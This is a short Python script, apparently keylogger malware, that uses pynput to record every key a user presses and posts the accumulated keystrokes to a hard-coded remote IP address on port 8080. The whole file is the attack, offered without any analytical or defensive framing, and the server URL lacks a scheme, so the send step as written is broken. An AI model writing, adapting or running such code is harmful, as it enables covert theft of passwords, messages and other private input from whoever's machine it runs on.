from pynput.keyboard import Listener, Key
import requests

server_url = '34.75.151.117:8080/get_logs'
logs = ''

def on_press(key):
    global logs


    try:
        requests.post(server_url, data={'logs': logs})
        logs = ''
    except:
        print('Server error!')
    logs += str(key).replace("'", "")

with Listener(on_press=on_press) as listener:
    listener.join()